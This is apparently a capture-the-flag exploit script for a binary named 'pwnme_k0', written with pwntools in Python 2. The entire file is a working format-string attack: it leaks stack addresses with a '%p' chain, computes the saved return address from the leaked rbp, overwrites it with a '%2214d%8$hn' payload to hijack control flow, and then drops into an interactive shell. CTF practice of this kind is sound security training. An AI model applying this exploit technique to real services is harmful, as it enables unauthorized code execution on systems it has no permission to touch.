from pwn import *
from LibcSearcher import *
pwnme = ELF('./pwnme_k0')
if args['REMOTE']:
    sh = remote(11, 11)
else:
    sh = process('./pwnme_k0')
sh.recvuntil(':\n')
sh.sendline('a' * 8)
sh.recvuntil(':\n')
sh.sendline('%p' * 9)
sh.recvuntil('>')
sh.sendline('1')
sh.recvuntil('a' * 8 + '\n')
data = sh.recvuntil('1.', drop=True).split('0x')
print data
data = data[1:]
rbp = int(data[5], 16)
ret_addr = rbp - 0x38
sh.recvuntil('>')
sh.sendline('2')
sh.recvuntil(':\n')
sh.sendline(p64(ret_addr))
sh.recvuntil(':\n')
payload = '%2214d%8$hn'
sh.sendline(payload)
sh.recvuntil('>')
sh.sendline('1')
sh.interactive()
